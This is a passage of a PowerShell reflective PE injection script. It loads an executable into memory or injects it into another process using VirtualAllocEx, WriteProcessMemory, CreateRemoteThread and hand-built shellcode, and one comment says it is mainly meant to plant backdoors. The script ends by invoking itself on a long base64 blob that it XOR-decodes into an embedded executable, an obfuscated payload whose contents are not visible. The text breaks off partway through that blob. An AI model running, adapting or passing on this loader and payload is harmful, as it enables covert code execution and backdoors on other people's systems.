		Write-Verbose "Copy PE sections in to memory"
		Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
		
		
		#Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

		
		#The PE we are in-memory loading has DLLs it needs, import those DLLs for it
		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($RemoteLoading -eq $true)
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
		}
		else
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}
		
		
		#Update the memory protection flags for all the memory just allocated
		if ($RemoteLoading -eq $false)
		{
			if ($NXCompatible -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}
		
		
		#If remote loading, copy the DLL in to remote process memory
		if ($RemoteLoading -eq $true)
		{
			[UInt32]$NumBytesWritten = 0
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
			if ($Success -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}
		
		
		#Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
		if ($PEInfo.FileType -ieq "DLL")
		{
			if ($RemoteLoading -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
				
				$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				if ($PEInfo.PE64Bit -eq $true)
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				$SCPSMemOriginal = $SCPSMem
				
				Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
				
				$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($RSCAddr -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}
				
				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
				{
					Throw "Unable to write shellcode to remote process memory."
				}

				$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
				if ($Result -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}
				
				$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{
			#Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
			[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
			$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

			#If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
			#	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."

			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			while($true)
			{
				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
				if ($ThreadDone -eq 1)
				{
					Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		
		return @($PEInfo.PEHandle, $EffectivePEHandle)
	}
	
	
	Function Invoke-MemoryFreeLibrary
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$PEHandle
		)
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Call FreeLibrary for all the imports of the DLL
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}

				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
				}
				
				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		
		#Call DllMain with process detach
		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
		
		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = 	Get-Win32Functions
		$Win32Types = 		Get-Win32Types
		$Win32Constants =  	Get-Win32Constants
		
		$RemoteProcHandle = [IntPtr]::Zero
	
		
		#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
		#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#		{
#			Write-Verbose "Getting SeDebugPrivilege"
#			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#		}	
		
		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $ProcId"
			}
			
			Write-Verbose "Got the handle for the remote process to inject in to"
		}
		
		#Load the PE reflectively
		Write-Verbose "Calling Invoke-MemoryLoadLibrary"
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes  -ForceASLR $ForceASLR
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}
		
		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
				
		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{
				Write-Verbose "Calling function with WString return type"
				[IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName $Func
				if ($WStringFuncAddr -eq [IntPtr]::Zero)
				{
					Throw "Couldn't find function address."
				}
				$WStringFuncDelegate = Get-DelegateType @() ([Int32])
				$WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
				[IntPtr]$OutputPtr = $WStringFunc.Invoke()
		}
		#For remote DLL injection, call a void function which takes no parameters
		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{
				Throw "VoidFunc couldn't be found in the DLL"
			}
			
			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
			
			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
		}
		
		#Don't free a library if it is injected in a remote process or if it is an EXE.
        #Note that all DLL's loaded by the EXE will remain loaded in memory.
		if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
		{
			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
		}
		else
		{
			#Delete the PE file from memory.
			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($Success -eq $false)
			{
				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			}
		}
		
		Write-Verbose "Done!"
	}

	Main
}

#Main function to either run the script locally or remotely
Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$DebugPreference  = "Continue"
	}
	
	Write-Verbose "PowerShell ProcessID: $PID"
	
	#if ($PsCmdlet.ParameterSetName -ieq "LocalFile")
	#{
    [Byte[]]$PEBytes = [System.Convert]::FromBase64String($PEBytes)
	
	for ($i = 0; $i -lt $PEBytes.Count; $i++)
	{
		$PEBytes[$i]=$PEBytes[$i] -bXOR 0x17
	}
	#[Byte[]]$PEBytes = [System.IO.File]::ReadAllBytes((Resolve-Path $PEPath))
	#}
	
	#Verify the image is a valid PE file
	$e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''

    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

    $PEBytes[0] = 0
    $PEBytes[1] = 0

	Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $Func, $ProcId,$ForceASLR)
}

Main

}
Invoke-ReflectivePEInjection -PEBytes "Wk2HFxQXFxcTFxcX6OgXF68XFxcXFxcXVxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXBxYXFxkIrRkXox7aNq8WW9o2Q39+ZDdnZXhwZXZ6N3R2eXl4Yzd1cjdlYnk3fnk3U1hEN3p4c3I5GhodMxcXFxcXFxcAtU9ZRNQhCkTUIQpE1CEKN7YiC07UIQo3tiQLxtQhCje2JQtW1CEKK6KLCkLUIQoror8KRdQhCtp05gpF1CEKnbYiC1DUIQqdtiQLW9QhCp22JQtV1CEKN7YgC1fUIQpE1CAK7tQhCo+3KAtQ1CEKj7chC0XUIQqPtyMLRdQhCkV+dH9E1CEKFxcXFxcXFxdHUhcXWxYTF/DuH00XFxcXFxcXF/cXFTYcFhkcF6cWFxfBFxcXFxcXb74XFxcHFxcX1xYXFxcXBxcHFxcXFRcXERcXFxcXFxcRFxcXFxcXFxenFRcXExcXFxcXFxUXVxYXFwcXFwcXFxcXBxcXBxcXFxcXFwcXFxfXRBUXKxYXF+tDFRffFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXF4cVFwcBFxeXUBUXCxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXF7dQFRdXFxcXFxcXFxcXFxcX1xYXkxUXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFzljcm9jFxcXirgWFxcHFxcXpxYXFxMXFxcXFxcXFxcXFxcXFzcXF3c5ZXN2Y3YXF421FxcX1xYXF7MXFxejFhcXFxcXFxcXFxcXFxdXFxdXOXN2Y3YXFxdvDxcXF2cVFxcZFxcXTxUXFxcXFxcXFxcXFxcXVxcX1zllcnt4dBcXBwEXFxeHFRcXDxcXF3EVFxcXFxcXFxcXFxcXF1cXF1UXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcX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